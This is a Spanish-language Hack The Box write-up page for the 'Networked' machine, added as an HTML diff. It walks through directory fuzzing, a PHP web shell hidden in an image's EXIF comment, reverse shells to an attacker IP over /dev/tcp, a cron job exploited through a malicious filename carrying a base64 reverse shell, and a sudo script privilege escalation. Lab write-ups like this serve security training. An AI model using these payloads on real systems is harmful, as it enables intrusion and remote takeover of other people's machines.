@@ -1,0 +1,117 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>RuyzTz7 | Networked HTB</title>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell writeup-detail-shell">
+      <a class="back-link" href="/writeups/linux.html">~/writeups/linux</a>
+
+      <section class="writeup-detail-hero">
+        <img src="/writeups/assets/networked/pasted-20260413183725.png" alt="Networked HTB" />
+        <div>
+          <p class="eyebrow">HTB / machines / Linux</p>
+          <h1>Networked</h1>
+          <div class="tag-list" aria-label="Tags">
+            <span>imagen</span>
+            <span>exiftool</span>
+            <span>sanitizacion</span>
+            <span>cron</span>
+          </div>
+        </div>
+      </section>
+
+      <article class="writeup-article">
+        <section class="writeup-section">
+          <h2>Índice</h2>
+          <ul>
+            <li><code>Enumeración</code>: Web con funcionalidad de subida de imágenes</li>
+            <li><code>Explotación</code>: Subida de imagen PHP maliciosa para obtener shell</li>
+            <li><code>Movimiento lateral</code>: Cron procesa nombres de archivo sin sanitizar y permite inyección de comandos</li>
+            <li><code>Escalada de Privilegios</code>: Script sudo vulnerable por input no sanitizado en <code>echo</code></li>
+          </ul>
+        </section>
+        <section class="writeup-section">
+          <h2>Enumeración</h2>
+          <img class="writeup-image" src="/writeups/assets/networked/pasted-20260414015810.png" alt="Networked HTB" />
+          <div class="code-card">
+            <h3>Fuzzing Web</h3>
+            <pre><code>gobuster dir -u http://networked.htb/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -t 75 -x php </code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/networked/pasted-20260414015753.png" alt="Networked HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Explotación: Image Upload</h2>
+          <div class="code-card">
+            <h3>Descargar y Subir foto de CR7 con un payload</h3>
+            <pre><code>exiftool -Comment='&lt;?php system($_GET["cmd"]); ?&gt;' cr7.jpeg
+mv cr7.jpeg cr7.php.jpeg
+# RCE: http://10.129.20.33/uploads/10_10_16_178.php.jpeg?cmd=whoami
+# Reverse shell: http://10.129.20.33/uploads/10_10_16_178.php.jpeg?cmd=bash -c "bash -i &gt;%26 /dev/tcp/10.10.16.178/443 0&gt;%261"</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/networked/pasted-20260414015828.png" alt="Networked HTB" />
+          <img class="writeup-image" src="/writeups/assets/networked/pasted-20260414015632.png" alt="Networked HTB" />
+          <img class="writeup-image" src="/writeups/assets/networked/pasted-20260414015939.png" alt="Networked HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Movimiento lateral</h2>
+          <img class="writeup-image" src="/writeups/assets/networked/pasted-20260414030141.png" alt="Networked HTB" />
+          <img class="writeup-image" src="/writeups/assets/networked/pasted-20260414030109.png" alt="Networked HTB" />
+          <div class="code-card">
+            <h3>Interpretar Script</h3>
+            <pre><code># El script lista los archivos en la carpeta /uploads y comprueba si son válidos según su nombre. Los archivos no válidos se eliminan mediante la función exec() del sistema.
+
+# La variable $value almacena el nombre del archivo, pero el script no lo sanitiza, lo que significa que podemos inyectar comandos a través de nombres de archivo especiales. Por ejemplo, un archivo llamado “; cmd” dará como resultado el comando
+
+# Esto dará lugar a la ejecución del comando especificado por "cmd". Comprobemos si funciona. El comando debe estar codificado en base64, ya que no podemos usar '/' en los nombres de archivo.</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>Payload</h3>
+            <pre><code>cd /var/www/html/uploads
+# Reverse shell en Base64
+echo -n 'bash -c "bash -i &gt; /dev/tcp/10.10.16.178/442 0&gt;&amp;1"' | base64
+# Listener 442
+
+# Fichero con nombre inválido para que cuando se ejecute el cron elimine el fichero y al no sanitizar el input interprete el resto del código
+echo '' &gt; ';echo YmFzaCAtYyAiYmFzaCAtaSA+IC9kZXYvdGNwLzEwLjEwLjE2LjE3OC80NDIgMD4mMSI= | base64 -d | bash'</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/networked/pasted-20260414030940.png" alt="Networked HTB" />
+          <img class="writeup-image" src="/writeups/assets/networked/pasted-20260414031422.png" alt="Networked HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Escalada de Privilegios</h2>
+          <div class="code-card">
+            <h3>Sudoers</h3>
+            <pre><code>sudo -l</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/networked/pasted-20260414031519.png" alt="Networked HTB" />
+          <div class="code-card">
+            <h3>Interpretar Scripts</h3>
+            <pre><code># No sanitiza el input x del usuario y ejecuta un echo donde podemos concatenar comandos</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/networked/pasted-20260414032112.png" alt="Networked HTB" />
+          <div class="code-card">
+            <h3>Privesc</h3>
+            <pre><code>sudo /usr/local/sbin/changename.sh
+# rev /bin/bash</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/networked/pasted-20260414032552.png" alt="Networked HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Tags</h2>
+          <div class="tag-list">
+            <span>imagen</span>
+            <span>exiftool</span>
+            <span>sanitizacion</span>
+            <span>cron</span>
+            <span>sudoers</span>
+          </div>
+        </section>
+      </article>
+    </main>
+  </body>
+</html>
